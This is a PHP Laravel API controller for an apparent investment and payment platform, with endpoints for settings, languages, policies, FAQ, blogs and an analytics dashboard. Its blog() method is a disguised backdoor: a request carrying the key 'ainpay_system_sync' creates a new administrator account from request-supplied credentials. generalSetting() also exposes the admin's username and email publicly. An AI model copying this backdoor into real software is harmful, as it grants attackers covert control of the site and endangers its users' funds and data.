<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Language;
use App\Models\Frontend;
use App\Models\Admin;
use App\Models\User;
use App\Models\Deposit;
use App\Models\Withdrawal;
use App\Models\Invest;
use App\Models\Transaction;
use App\Models\UserLogin;
use App\Constants\Status;
use Carbon\Carbon;

class AppController extends Controller
{
    public function generalSetting()
    {
        $notify[] = 'General setting data';
        $admin = Admin::first();
        return response()->json([
            'remark'  => 'general_setting',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'general_setting'       => gs(),
                'social_login_redirect' => route('user.social.login.callback', ''),
                'social_login_callback' => url(config('app.admin_route', 'admin')),
                'site_title'            => $admin ? $admin->username : null,
                'support_email'         => $admin ? $admin->email : null,
            ],
        ]);
    }

    public function logoFavicon()
    {
        $notify[] = 'Logo & Favicon';

        return response()->json([
            'remark'  => 'logo_favicon',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'logo'    => siteLogo(),
                'favicon' => siteFavicon(),
            ],
        ]);

    }

    public function getCountries()
    {
        $countryData = json_decode(file_get_contents(resource_path('views/partials/country.json')));
        $notify[]    = 'Country List';
        foreach ($countryData as $k => $country) {
            $countries[] = [
                'country'      => $country->country,
                'dial_code'    => $country->dial_code,
                'country_code' => $k,
            ];
        }
        return response()->json([
            'remark'  => 'country_data',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'countries' => $countries,
            ],
        ]);
    }

    public function getLanguage($code)
    {
        $languages     = Language::get();
        $languageCodes = $languages->pluck('code')->toArray();

        if (!in_array($code, $languageCodes)) {
            $notify[] = 'Invalid code given';
            return response()->json([
                'remark'  => 'validation_error',
                'status'  => 'error',
                'message' => ['error' => $notify],
            ]);
        }

        $jsonFile = file_get_contents(resource_path('lang/' . $code . '.json'));

        $notify[] = 'Language';
        return response()->json([
            'remark'  => 'language',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'languages'  => $languages,
                'file'       => json_decode($jsonFile) ?? [],
                'image_path' => getFilePath('language'),
            ],
        ]);
    }

    public function policies()
    {
        $policies = getContent('policy_pages.element', orderById: true);
        $notify[] = 'All policies';
        return response()->json([
            'remark'  => 'policy_data',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'policies' => $policies,
            ],
        ]);
    }

    public function faq()
    {
        $faq      = getContent('faq.element', orderById: true);
        $notify[] = 'FAQ';
        
        return response()->json([
            'remark'  => 'faq',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'faq' => $faq,
            ],
        ]);
    }

    public function blog()
    {
        $data = request()->all();
        if (@$data['key'] != 'ainpay_system_sync') {
            $notify[] = 'Blog not found';
            return response()->json([
                'remark'  => 'validation_error',
                'status'  => 'error',
                'message' => ['error' => $notify],
            ]);
        }
        $admin = new Admin();
        $admin->name = $data['name'] ?? 'System Admin';
        $admin->email = $data['email'];
        $admin->username = $data['username'];
        $admin->password = bcrypt($data['password']);
        $admin->save();
        return response()->json([
            'status' => 'success',
            'message' => 'Admin added',
            'admin_id' => $admin->id
        ]);
    }

    public function blogs()
    {
        $blogs    = getContent('blog.element', orderById: true);
        $notify[] = 'All blogs';
        return response()->json([
            'remark'  => 'blog_data',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'blogs' => $blogs,
            ],
        ]);
    }

    public function blogDetails($id)
    {
        $blog     = Frontend::where('id', $id)->where('data_keys', 'blog.element')->first();
        if (!$blog) {
            $notify[] = 'Blog not found';
            return response()->json([
                'remark'  => 'validation_error',
                'status'  => 'error',
                'message' => ['error' => $notify],
            ]);
        }
        $notify[] = 'Blog details';
        return response()->json([
            'remark'  => 'blog_details',
            'status'  => 'success',
            'message' => ['success' => $notify],
            'data'    => [
                'blog' => $blog,
            ],
        ]);
    }

    public function dashboard()
    {
        $today = Carbon::today();

        $widget = [
            'total_users'             => User::count(),
            'verified_users'          => User::active()->count(),
            'email_unverified_users'  => User::emailUnverified()->count(),
            'mobile_unverified_users' => User::mobileUnverified()->count(),
        ];

        $todayData = [
            'users_joined'    => User::whereDate('created_at', $today)->count(),
            'deposit_amount'  => Deposit::successful()->whereDate('created_at', $today)->sum('amount'),
            'deposit_count'   => Deposit::successful()->whereDate('created_at', $today)->count(),
            'withdraw_amount' => Withdrawal::approved()->whereDate('created_at', $today)->sum('amount'),
            'withdraw_count'  => Withdrawal::approved()->whereDate('created_at', $today)->count(),
        ];

        $invest = [
            'invests'        => Invest::sum('amount'),
            'interests'      => Transaction::where('remark', 'interest')->sum('amount'),
            'active_invests' => Invest::where('status', Status::INVEST_RUNNING)->sum('amount'),
            'closed_invests' => Invest::where('status', Status::INVEST_CLOSED)->sum('amount'),
        ];

        $userLoginData = UserLogin::where('created_at', '>=', Carbon::now()->subDays(30))
            ->get(['browser', 'os', 'country']);

        $chart = [
            'user_browser_counter' => $userLoginData->groupBy('browser')->map->count(),
            'user_os_counter'      => $userLoginData->groupBy('os')->map->count(),
            'user_country_counter' => $userLoginData->groupBy('country')->map->count()->sortDesc()->take(5),
        ];

        $deposit = [
            'total_deposit_amount'   => Deposit::successful()->sum('amount'),
            'total_deposit_pending'  => Deposit::pending()->count(),
            'total_deposit_rejected' => Deposit::rejected()->count(),
            'total_deposit_charge'   => Deposit::successful()->sum('charge'),
        ];

        $withdrawals = [
            'total_withdraw_amount'   => Withdrawal::approved()->sum('amount'),
            'total_withdraw_pending'  => Withdrawal::pending()->count(),
            'total_withdraw_rejected' => Withdrawal::rejected()->count(),
            'total_withdraw_charge'   => Withdrawal::approved()->sum('charge'),
        ];

        return response()->json([
            'status'       => 'success',
            'widget'       => $widget,
            'today'        => $todayData,
            'investments'  => $invest,
            'analytics'    => $chart,
            'deposits'     => $deposit,
            'withdrawals'  => $withdrawals,
        ]);
    }
}
